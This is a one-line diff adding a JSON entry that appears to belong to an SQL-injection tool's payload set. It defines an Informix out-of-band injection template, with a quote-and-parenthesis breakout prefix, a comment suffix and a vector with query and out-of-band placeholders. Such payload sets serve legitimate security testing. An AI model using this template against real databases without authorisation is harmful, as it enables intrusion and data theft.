@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "oob", "boundary": {"prefix": "')) ", "suffix": "-- -", "type": "paren2-single-ws"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "informix oob: single in 2 parens ws"}
